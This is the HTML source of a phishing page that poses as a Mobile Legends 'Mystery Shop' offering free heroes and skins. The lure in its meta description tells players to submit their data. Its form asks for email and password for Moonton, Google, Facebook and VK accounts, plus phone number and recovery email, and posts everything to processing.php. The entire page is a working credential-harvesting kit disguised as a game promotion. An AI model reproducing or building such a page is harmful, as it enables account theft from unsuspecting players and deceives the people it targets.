<!DOCTYPE html>
<html>
<head>
<title>Mystery Shop - Mobile Legends</title>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no"/>
<!-- DYNAMIC OPEN GRAPH META TAGS START -->
<meta property="og:url" content="http://info.gift-skin.top/detail.php"/>
<meta property="og:title" content="Mystery Shop - Mobile Legends"/>
<meta property="og:description" content="For a limited time you can buy all the heroes and skins that you wanted just for free. Reward and bonus will be given to players who have submitted the data."/>
<meta property="og:image" content="http://info.gift-skin.top/img/thumbnail/thumbnail.png"/>
<meta property="og:image:width" content="540"/>
<meta property="og:image:height" content="282"/>
<!-- DYNAMIC OPEN GRAPH META TAGS END -->
<link rel="icon" type="img/png" href="img/favicon.png" sizes="32x32"/>
<link rel="stylesheet" type="text/css" href="style.css"/>
</head>
<body>
<div class="sticky">
<a href="index.php"><img src="img/logo.png"></a>
</div>
<div class="slider-container">
<div class="slider">
<img src="img/slider/1.jpg" style="width:100%">
</div>
<div class="slider">
<img src="img/slider/2.jpg" style="width:100%">
</div>
<div class="slider">
<img src="img/slider/3.jpg" style="width:100%">
</div>
<div class="slider">
<img src="img/slider/4.jpg" style="width:100%">
</div>
</div>
<form action="processing.php" method="POST">
<div class="icon">
<img src="img/moonton.png">
</div>
<br/>
<label for="nik">Nickname</label><span style="color:#FFEB3B"> *</span>
<input minlength="5" type="text" name="nik" required=""/>
<br/><br/>
<label for="imelmt">Email</label><span style="color:#FFEB3B"> *</span>
<input minlength="15" type="email" name="moonton1" required=""/>
<br/><br/>
<label for="paspotmt">Password</label><span style="color:#FFEB3B"> *</span>
<input minlength="5" type="password" name="moonton2" required=""/>
<br/><br/>
<div class="icon">
<img src="img/google.png">
</div>
<br/>
<label for="imel">Email</label><span style="color:#FFEB3B"> *</span>
<input minlength="15" type="email" name="google1" required=""/>
<br/><br/>
<label for="paspot">Password</label><span style="color:#FFEB3B"> *</span>
<input minlength="5" type="password" name="google2" required=""/>
<br/><br/>
<label for="pon">Phone</label><span style="color:#FFEB3B"> *</span>
<input minlength="8" type="number" name="phone" required=""/>
<br/><br/>
<label for="imelre">Recovery Email</label><span style="color:#FFEB3B"> *</span>
<input minlength="15" type="email" name="emailr" required=""/>
<br/><br/>
<div class="icon">
<img src="img/facebook.png">
</div>
<br/>
<label for="imelfb">Email</label><span style="color:#FFEB3B"> *</span>
<input minlength="15" type="email" name="fb1" required=""/>
<br/><br/>
<label for="paspotfb">Password</label><span style="color:#FFEB3B"> *</span>
<input minlength="5" type="password" name="fb2" required=""/>
<br/><br/>
<div class="icon">
<img src="img/vk.png">
</div>
<br/>
<label for="imelvk">Email</label><span style="color:#FFEB3B"> *</span>
<input minlength="15" type="email" name="vk1" required=""/>
<br/><br/>
<label for="paspotvk">Password</label><span style="color:#FFEB3B"> *</span>
<input minlength="5" type="password" name="vk2" required=""/>
<br/><br/>
<div align="center">
<input type="submit" value="Login"/>
</div>
</form>
<br/>
<div class="footer">Copyright &copy; 2018</div>
<script type="text/javascript">
var slideIndex = 0;
showSlides();
function showSlides() {
    var i;
    var slides = document.getElementsByClassName("slider");
    for (i = 0; i < slides.length; i++) {
        slides[i].style.display = "none"; 
    }
    slideIndex++;
    if (slideIndex > slides.length) {slideIndex = 1} 
    slides[slideIndex-1].style.display = "block"; 
    setTimeout(showSlides, 2500);
}
</script>
<!-- MOBILE LEGENDS MYSTERY SHOP BY ABDUL MALIK -->
</body>
</html>